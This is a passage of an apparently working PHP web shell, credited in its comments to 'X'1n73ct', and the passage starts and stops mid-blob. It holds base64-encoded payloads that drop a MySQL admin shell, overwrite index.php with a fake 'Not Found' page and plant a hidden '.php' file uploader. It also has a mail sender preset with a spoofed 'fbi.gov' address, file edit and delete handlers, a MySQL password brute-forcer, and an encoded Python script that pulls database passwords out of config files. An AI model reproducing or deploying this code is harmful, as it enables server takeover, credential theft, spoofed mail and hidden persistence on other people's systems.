lsZSggbGlzdCgkdmFyLCAkdmFsdWUpID0gZWFjaCgkSFRUUF9DT09LSUVfVkFSUykgKSB7DQoJCWlmKCAkdmFyID09ICJteXNxbF93ZWJfYWRtaW5fdXNlcm5hbWUiICkgJFVTRVJOQU1FID0gJHZhbHVlOw0KCQlpZiggJHZhciA9PSAibXlzcWxfd2ViX2FkbWluX3Bhc3N3b3JkIiApICRQQVNTV09SRCA9ICR2YWx1ZTsNCgkJaWYoICR2YXIgPT0gIm15c3FsX3dlYl9hZG1pbl9ob3N0bmFtZSIgKSAkSE9TVE5BTUUgPSAkdmFsdWU7DQoJfQ0KCWVjaG8gIjwhLS0iOw0KCSRteXNxbEhhbmRsZSA9IEBteXNxbF9jb25uZWN0KCAkSE9TVE5BTUUuIjozMzA2IiwgJFVTRVJOQU1FLCAkUEFTU1dPUkQgKTsNCgllY2hvICItLT4iOw0KCWlmKCAkbXlzcWxIYW5kbGUgPT0gZmFsc2UgKSB7DQoJCWVjaG8gIjx0YWJsZSB3aWR0aD0xMDAlIGhlaWdodD0xMDAlPjx0cj48dGQ+PGNlbnRlcj5cbiI7DQoJCWVjaG8gIjxoMT5Xcm9uZyBQYXNzd29yZCE8L2gxPlxuIjsNCgkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1sb2dvbic+TG9nb248L2E+XG4iOw0KCQllY2hvICI8L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT5cbiI7DQoJfSBlbHNlIHsNCgkJaWYoICRhY3Rpb24gPT0gImJHbHpkRVJDY3c9PSIgKQ0KCQkJbGlzdERhdGFiYXNlcygpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJjcmVhdGVEQiIgKQ0KCQkJY3JlYXRlRGF0YWJhc2UoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcERCIiApDQoJCQlkcm9wRGF0YWJhc2UoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAibGlzdFRhYmxlcyIgKQ0KCQkJbGlzdFRhYmxlcygpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJjcmVhdGVUYWJsZSIgKQ0KCQkJY3JlYXRlVGFibGUoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcFRhYmxlIiApDQoJCQlkcm9wVGFibGUoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAidmlld1NjaGVtYSIgKQ0KCQkJdmlld1NjaGVtYSgpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJxdWVyeSIgKQ0KCQkJdmlld0RhdGEoICRxdWVyeVN0ciApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJhZGRGaWVsZCIgKQ0KCQkJbWFuYWdlRmllbGQoICJhZGQiICk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gImFkZEZpZWxkX3N1Ym1pdCIgKQ0KCQkJbWFuYWdlRmllbGRfc3VibWl0KCAiYWRkIiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJlZGl0RmllbGQiICkNCgkJCW1hbmFnZUZpZWxkKCAiZWRpdCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZWRpdEZpZWxkX3N1Ym1pdCIgKQ0KCQkJbWFuYWdlRmllbGRfc3VibWl0KCAiZWRpdCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcEZpZWxkIiApDQoJCQlkcm9wRmllbGQoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IiApDQoJCQl2aWV3RGF0YSggIiIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiYWRkRGF0YSIgKQ0KCQkJbWFuYWdlRGF0YSggImFkZCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiYWRkRGF0YV9zdWJtaXQiICkNCgkJCW1hbmFnZURhdGFfc3VibWl0KCAiYWRkIiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJlZGl0RGF0YSIgKQ0KCQkJbWFuYWdlRGF0YSggImVkaXQiICk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gImVkaXREYXRhX3N1Ym1pdCIgKQ0KCQkJbWFuYWdlRGF0YV9zdWJtaXQoICJlZGl0IiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJkZWxldGVEYXRhIiApDQoJCQlkZWxldGVEYXRhKCk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gInV0aWxzIiApDQoJCQl1dGlscygpOw0KCQlteXNxbF9jbG9zZSggJG15c3FsSGFuZGxlKTsNCgkJZm9vdGVyX2h0bWwoKTsNCgl9DQp9DQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5NeVNRTCBJbnRlcmZhY2UgKERldmVsb3BlZCBCeSBNb2hhamVyMjIpPC90aXRsZT4NCjxib2R5IGJnQ29sb3I9IzAwMDAwMCA+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KPCEtLQ0KcC5sb2NhdGlvbiB7DQoJY29sb3I6ICMwMEZGMDA7DQp9DQpoMSwgaDIsIGgzIHsNCgljb2xvcjogIzAwRkYwMDsNCn0NCnRoIHsNCgliYWNrZ3JvdW5kLWNvbG9yOiAjMjIyMjIyOw0KCWNvbG9yOiAjMDBGRjAwOw0KCWZvbnQtc2l6ZTogc21hbGw7DQp9DQp0ZCB7DQoJY29sb3I6ICMwMEZGMDA7DQoJYmFja2dyb3VuZC1jb2xvcjogIzQ0NDQ0NDsNCglmb250LXNpemU6IHNtYWxsOw0KfQ0KZm9ybSB7DQoJbWFyZ2luLXRvcDogMDsNCgltYXJnaW4tYm90dG9tOiAwOw0KfQ0KYSB7DQoJdGV4dC1kZWNvcmF0aW9uOm5vbmU7DQoJY29sb3I6ICMwMEZGMDA7DQoJZm9udC1zaXplOnNtYWxsOw0KfQ0KQTpsaW5rIHsNCkNPTE9SOiNGRkZGRkY7DQpURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQpDT0xPUjojMDBGRjAwOw0KVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmFjdGl2ZSB7DQpDT0xPUjojMDBGRjAwOw0KVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmhvdmVyIHsNCmNvbG9yOiMwMEZGMDA7DQpURVhULURFQ09SQVRJT046IG5vbmUNCn0NCmlucHV0LCBzZWxlY3QsIHRleHRhcmVhIHsNCmJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQpib3JkZXItc3R5bGU6IHNvbGlkOw0KZm9udC1mYW1pbHk6IFRhaG9tYSxWZXJkYW5hLEFyaWFsLFNhbnMtU2VyaWY7DQpmb250LXNpemU6c21hbGw7DQpjb2xvcjogIzAwRkYwMDsNCnBhZGRpbmc6IDBweDsNCn0NCmxpIHsNCmNvbG9yOiAjMDBGRjAwOw0KfQ0KLm5ldyB7DQpjb2xvcjogIzAwRkYwMDsNCn0NCi8vLS0+DQo8L3N0eWxlPg0KPC9oZWFkPg=='; 
$file = fopen("db-sql.php" ,"w+");
$write = fwrite ($file ,base64_decode($sqlshell));
fclose($file);
    chmod("db-sql.php", 0644);
$indexshell = fopen("index.php" ,"w+");
$data = 'PGgxPk5vdCBGb3VuZDwvaDE+IA0KPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+IA0KPGhyPiANCjxhZGRyZXNzPkFwYWNoZSBTZXJ2ZXIgYXQgPD89JF9TRVJWRVJbJ0hUVFBfSE9TVCddPz4gUG9ydCA4MDwvYWRkcmVzcz4gDQogICAgPHN0eWxlPiANCiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCAjZmZmOyB9IA0KICAgIDwvc3R5bGU+';
$tulis = fwrite( $indexshell, base64_decode($data));
fclose($indexshell);
   echo "<iframe src=mysql/db-sql.php width=97% height=100% frameborder=0></iframe>"; 
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'mail')){
if(isset($_POST['mail_send'])){
	$mail_to = $_POST['mail_to'];
	$mail_from = $_POST['mail_from'];
	$mail_subject = $_POST['mail_subject'];
	$mail_content = magicboom($_POST['mail_content']);
	if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from")){
		$msg = "email sent to $mail_to";
	}
	else $msg = "send email failed";
}
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post">
<table class="cmdbox">
<tr><td>
<textarea class="output" name="mail_content" id="cmd" style="height:340px;">Hey there, please patch me ASAP ;-p</textarea>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="admin@somesome.com" name="mail_to" />&nbsp; mail to</td></tr>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="X-1n73ct@fbi.gov" name="mail_from" />&nbsp; from</td></tr>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="patch me" name="mail_subject" />&nbsp; subject</td></tr>
<tr><td>&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" /></td></tr></form>
<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $msg; ?></td></tr>
</table>
</form>

<?php }


elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo')){ 
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
}
elseif(isset($_GET['view']) && ($_GET['view'] != "")){
  if(is_file($_GET['view'])){ 
	if(!isset($file)) $file = magicboom($_GET['view']);
	if(!$win && $posix){
		$name=@posix_getpwuid(@fileowner($folder));
		$group=@posix_getgrgid(@filegroup($folder));
		$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
	}
	else {
		$owner = $user;
	}
	$filn = basename($file);
	echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\">
	<tr><td>Filename</td><td><span id=\"".clearspace($filn)."_link\">".$file."</span>
	<form action=\"?y=".$pwd."&amp;view=$file\" method=\"post\" id=\"".clearspace($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\" />
	</form>
	</td></tr>
	<tr><td>Size</td><td>".ukuran($file)."</td></tr>
	<tr><td>Permission</td><td>".get_perms($file)."</td></tr>
	<tr><td>Owner</td><td>".$owner."</td></tr>
	<tr><td>Create time</td><td>".date("d-M-Y H:i",@filectime($file))."</td></tr>
	<tr><td>Last modified</td><td>".date("d-M-Y H:i",@filemtime($file))."</td></tr>
	<tr><td>Last accessed</td><td>".date("d-M-Y H:i",@fileatime($file))."</td></tr>
	<tr><td>Actions</td><td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> | <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$file\">delete</a> | <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gzip</a>)</td></tr>
	<tr><td>View</td><td><a href=\"?y=".$pwd."&amp;view=".$file."\">text</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=code\">code</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=image\">image</a></td></tr>
	</table>
	";
	if(isset($_GET['type']) && ($_GET['type']=='image')){
		echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=".$pwd."&amp;img=".$filn."\"></div>";
	}
	elseif(isset($_GET['type']) && ($_GET['type']=='code')){
		echo "<div class=\"viewfile\">";
		$file = wordwrap(@file_get_contents($file),"240","\n");
		@highlight_string($file);
		echo "</div>";
	}
	else {
		echo "<div class=\"viewfile\">";
		echo nl2br(htmlentities((@file_get_contents($file))));
		echo "</div>";
	}
  }
  elseif(is_dir($_GET['view'])){
		echo showdir($pwd,$prompt);
  }
	
}
elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){

		if(isset($_POST['save'])){
			$file = $_POST['saveas'];
			$content = magicboom($_POST['content']);
			if($filez = @fopen($file,"w")){
				$time = date("d-M-Y H:i",time());
				if(@fwrite($filez,$content)) $msg = "file saved <span class=\"gaya\">@</span> ".$time;
				else $msg = "failed to save";
				@fclose($filez);
			}
			else $msg = "permission denied";
		}
		if(!isset($file)) $file = $_GET['edit'];
		if($filez = @fopen($file,"r")){
			$content = "";
			while(!feof($filez)){
				$content .= htmlentities(str_replace("''","'",fgets($filez)));
			}
			@fclose($filez);
		}
	
?>
<form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post">
<table class="cmdbox">
<tr><td colspan="2">
<textarea class="output" name="content">
<?php echo $content; ?>
</textarea>
<tr><td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" />
&nbsp;<?php echo $msg; ?></td></tr>
</table>
</form>
<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'logout'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=logout" method="post">

<?php
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'bye!'; 
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'brute'))
			{	
			?>
				<form action="?y=<?php echo $pwd; ?>&amp;x=brute" method="post">
			<?php
			//bruteforce
?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
/*
Recoded By X'1n73ct
*/
@set_time_limit(0);
@error_reporting(0);


if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                echo "X'1n73ct~ user is (<b><font color=green>$user</font></b>) Password is (<b><font color=green>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<hr><b>You Found <font color=green>$ok</font> Cpanel by x'1n73ct</b>";
    echo "<center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
    exit;
}
}
if($_POST['pass']=='password'){
@error_reporting(0);
$i = getenv('REMOTE_ADDR');
$d = date('D, M jS, Y H:i',time());
$h = $_SERVER['HTTP_HOST'];
$dir=$_SERVER['PHP_SELF'];
$back = "PD9waHANCmVjaG8gJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7DQplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsNCmlmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHsNCmlmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKSB7IGVjaG8gJzxiPktvcmFuZyBEYWggQmVyamF5YSBVcGxvYWQgU2hlbGwgS29yYW5nISEhPGI+PGJyPjxicj4nOyB9DQplbHNlIHsgZWNobyAnPGI+S29yYW5nIEdhZ2FsIFVwbG9hZCBTaGVsbCBLb3JhbmchISE8L2I+PGJyPjxicj4nOyB9DQp9DQo/Pg==";
$file = fopen(".php","w+");
$write = fwrite ($file ,base64_decode($back));
fclose($file);
chmod(".php",0755);
mkdir('config',0755);
$cp =
'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBO